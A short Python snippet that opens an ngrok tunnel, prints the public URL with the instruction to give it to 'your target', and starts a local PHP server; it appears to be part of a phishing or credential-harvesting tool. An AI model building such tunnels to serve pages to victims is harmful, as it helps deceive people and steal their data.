from pyngrok import ngrok
import os

def generate():
    domain = ngrok.connect()
    print('Give This Domain to Your Target AS https  ===>',domain)
    os.system("php -S localhost:80")
    input()
